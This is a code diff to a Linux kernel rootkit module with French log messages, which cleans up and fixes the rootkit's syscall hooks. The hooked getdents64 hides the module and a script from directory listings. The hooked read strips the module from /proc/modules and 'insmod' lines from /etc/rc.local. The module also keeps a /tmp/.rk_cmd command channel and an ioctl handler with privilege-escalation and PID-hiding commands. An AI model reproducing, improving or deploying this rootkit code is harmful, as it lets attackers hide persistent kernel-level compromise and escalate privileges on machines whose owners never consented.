@@ -69,17 +69,18 @@ static asmlinkage long new_getdents64(const struct pt_regs *regs)
         return ret;
 
     kbuf = kzalloc(ret, GFP_KERNEL);
-    if (!kbuf)
-        return ret;
-
-    if (copy_from_user(kbuf, dirent, ret))
-    {
-        kfree(kbuf);
-        return ret;
+    
+    if (!kbuf) {
+        pr_err("Allocation mémoire échouée\n");
+        return -ENOMEM;
     }
 
-    while (bpos < ret)
-    {
+    if (copy_from_user(kbuf, dirent, ret)) {
+        kfree(kbuf);
+        return -EFAULT;
+    }
+
+    while (bpos < ret) {
         cur = (struct linux_dirent64 *)((char *)kbuf + bpos);
         if (strcmp(cur->d_name, NAME_MODULE) == 0 || strcmp(cur->d_name, HIDDEN_SCRIPT) == 0)
         {
@@ -93,8 +94,7 @@ static asmlinkage long new_getdents64(const struct pt_regs *regs)
         }
     }
 
-    if (copy_to_user(dirent, kbuf, ret))
-    {
+    if (copy_to_user(dirent, kbuf, ret)) {
         kfree(kbuf);
         return -EFAULT;
     }
@@ -127,245 +127,123 @@ static asmlinkage long new_getdents64(const struct pt_regs *regs)
  * @note    All memory allocated with kzalloc must be freed with
  *          kfree before each return to avoid memory leaks.
  */
-asmlinkage long
-new_read(
-    const struct pt_regs
-        *regs)
+static asmlinkage long new_read(const struct pt_regs *regs)
 {
-    char
-        *end;
+    char *end;
 
-    long
-        ret = 0;
+    long ret = 0;
 
-    char
-        buf[256];
+    char buf[256];
 
-    int
-        fd = regs->di;
-    struct file
-        *f = fget(
-            fd);
+    int fd = regs->di;
+    struct file *f = fget(fd);
 
     if (!f)
         return ret;
 
-    char
-        *path_fd = d_path(
-            &f->f_path,
-            buf,
-            sizeof(
-                buf));
-    fput(
-        f);
+    char *path_fd = d_path(&f->f_path, buf, sizeof(buf));
+    fput(f);
 
-    if (
-        strcmp(
-            path_fd,
-            "/tmp/.rk_cmd") == 0)
-    {
+    if (strcmp(path_fd, "/tmp/.rk_cmd") == 0) {
 
         uid_t uid = current_uid().val;
 
-        if (
-            uid != 0 && uid != 1000)
+        if (uid != 0 && uid != 1000)
             return ret;
 
-        if (
-            strlen(
-                rk_msg) == 0)
-        {
+        if (strlen(rk_msg) == 0) {
             return ret;
         }
 
-        if (
-            copy_to_user(
-                (
-                    void __user *)regs->si,
-                rk_msg,
-                strlen(
-                    rk_msg)))
+        if (copy_to_user((void __user *)regs->si, rk_msg, strlen(rk_msg)))
             return -EFAULT;
 
-        return strlen(
-            rk_msg);
+        return strlen(rk_msg);
     }
 
-    ret = orig_read(
-        regs);
+    ret = orig_read(regs);
 
-    if (
-        ret <= 0)
+    if (ret <= 0)
         return ret;
 
-    if (
-        strcmp(
-            path_fd,
-            "/proc/modules") == 0)
-    {
-        char
-            *kbuf;
+    if (strcmp(path_fd, "/proc/modules") == 0) {
+        char *kbuf;
 
-        kbuf = kzalloc(
-            ret,
-            GFP_KERNEL);
-        if (
-            !kbuf)
+        kbuf = kzalloc(ret, GFP_KERNEL);
+        
+        if (!kbuf)
             return -ENOMEM;
 
-        if (
-            copy_from_user(
-                kbuf,
-                (
-                    void __user *)
-                    regs->si,
-                ret))
-        {
-            kfree(
-                kbuf);
+        if (copy_from_user(kbuf, (void __user *)regs->si, ret)) {
+            kfree(kbuf);
             return -EFAULT;
         }
 
-        if (
-            kbuf != NULL)
-        {
-            char
-                *line = strstr(
-                    kbuf,
-                    NAME_MODULE);
+        if (kbuf != NULL) {
+            char *line = strstr(kbuf, NAME_MODULE);
 
-            if (
-                !line)
-            {
-                kfree(
-                    kbuf);
+            if (!line) {
+                kfree(kbuf);
                 return ret;
             }
 
-            end = strchr(
-                line,
-                '\n');
+            end = strchr(line, '\n');
 
-            if (
-                end != NULL)
-            {
+            if (end != NULL) {
                 end++;
+                memmove(line, end, strlen(end) + 1);
 
-                memmove(
-                    line,
-                    end,
-                    strlen(
-                        end) +
-                        1);
-
-                ret -=
-                    end - line;
-            }
-            else
-            {
+                ret -= end - line;
+            } else {
                 *kbuf = '\0';
             }
         }
 
-        if (
-            copy_to_user(
-                (
-                    void __user *)regs->si,
-                kbuf,
-                ret))
-        {
-            kfree(
-                kbuf);
+        if (copy_to_user((void __user *)regs->si, kbuf, ret)) {
+            kfree(kbuf);
             return -EFAULT;
         }
 
-        kfree(
-            kbuf);
+        kfree(kbuf);
     }
 
-    if (
-        strcmp(
-            path_fd,
-            "/etc/rc.local") == 0)
-    {
-        char
-            *kbuf;
+    if (strcmp(path_fd, "/etc/rc.local") == 0) {
+        char *kbuf;
 
-        kbuf = kzalloc(
-            ret,
-            GFP_KERNEL);
-        if (
-            !kbuf)
+        kbuf = kzalloc(ret, GFP_KERNEL);
+        if (!kbuf)
             return -ENOMEM;
 
-        if (
-            copy_from_user(
-                kbuf,
-                (
-                    void __user *)
-                    regs->si,
-                ret))
-        {
-            kfree(
-                kbuf);
+        if (copy_from_user(kbuf, (void __user *)regs->si, ret)) {
+            kfree(kbuf);
             return -EFAULT;
         }
 
-        if (
-            kbuf != NULL)
-        {
-            char
-                *line = strstr(
-                    kbuf,
-                    "insmod");
+        if (kbuf != NULL) {
+            char *line = strstr(kbuf, "insmod");
 
-            if (
-                !line)
-            {
-                kfree(
-                    kbuf);
+            if (!line) {
+                kfree(kbuf);
                 return ret;
             }
 
-            end = strchr(
-                line,
-                '\n');
+            end = strchr(line, '\n');
 
-            if (
-                end != NULL)
-            {
+            if (end != NULL) {
                 end++;
-
-                memmove(
-                    line,
-                    end,
-                    strlen(
-                        end) +
-                        1);
-
-                ret -=
-                    end - line;
-            }
-            else
-            {
+                memmove(line, end, strlen(end) + 1);
+                ret -= end - line;
+            } else {
                 *kbuf = '\0';
             }
         }
 
-        if (
-            copy_to_user(
-                (
-                    void __user *)regs->si,
-                kbuf,
-                ret))
-        {
-            kfree(
-                kbuf);
+        if (copy_to_user((void __user *)regs->si, kbuf, ret)) {
+            kfree(kbuf);
             return -EFAULT;
         }
 
-        kfree(
-            kbuf);
+        kfree(kbuf);
     }
 
     return ret;
@@ -630,14 +508,14 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
     case RK_CMD_PRIVESC:
         if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
             return -EFAULT;
-        printk(KERN_INFO "rootkit: PRIVESC pour PID=%u\n", args.target);
+        printk(KERN_INFO "rootkit: PRIVESC pour PID=%lu\n", args.target);
         /* TODO: commit_creds(prepare_kernel_cred(NULL)) */
         break;
 
     case RK_CMD_HIDE_PID:
         if (copy_from_user(&args, (struct rk_args __user *)arg, sizeof(args)))
             return -EFAULT;
-        printk(KERN_INFO "rootkit: HIDE_PID pour PID=%u\n", args.target);
+        printk(KERN_INFO "rootkit: HIDE_PID pour PID=%lu\n", args.target);
         /* TODO: retirer le PID de la liste des taches */
         break;
 
@@ -646,7 +524,7 @@ static long rk_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
         args.value = 0;
         if (copy_to_user((struct rk_args __user *)arg, &args, sizeof(args)))
             return -EFAULT;
-        printk(KERN_INFO "rootkit: GETUID uid=%u\n", args.target);
+        printk(KERN_INFO "rootkit: GETUID uid=%lu\n", args.target);
         break;
 
     case RK_CMD_SET_MSG:
